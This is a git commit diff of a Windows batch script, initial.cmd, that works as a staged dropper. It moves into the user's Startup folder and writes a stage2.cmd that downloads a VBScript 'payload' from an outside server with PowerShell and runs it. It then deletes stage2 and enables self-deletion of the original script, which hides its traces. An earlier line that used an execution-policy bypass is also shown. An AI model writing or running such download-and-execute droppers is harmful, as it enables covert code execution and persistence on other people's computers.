329b980804fcd16626a2396fb83ebfbd011ebebf
Oorth <arthmaurya@gmail.com>
2024-11-29 14:48:04 +0530

    now stage2 downloads the payload from the server and deletes itself

--- initial.cmd
+++ initial.cmd
@@ -6,15 +6,20 @@ SET STARTUPPATH="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Men
 cd %STARTUPPATH%
 
 
+@REM Wirtes the powershell script to download and run the payloads to a .cmd file called "stage2.cmd"
+(
     @REM download the payload
-    powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/popup.cmd' -OutFile 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'
-
-
+    echo powershell "Invoke-WebRequest -Uri 'https://arth.imbeddex.com/Basic_typr.vbs' -OutFile payload.vbs"
+    echo powershell Start-Sleep -Seconds 1
+    echo powershell ./payload.vbs
     @REM run stage2
-    powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
+    @REM powershell -ExecutionPolicy Bypass -Command "& 'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\popup.cmd'"
+) > stage2.cmd
 
+powershell ./stage2.cmd
+del stage2.cmd
 
 @rem uncomment to make the script delete itself
-@REM cd %currentDirectory%
-@rem del initial.bat
+cd %currentDirectory%
+del initial.cmd
 
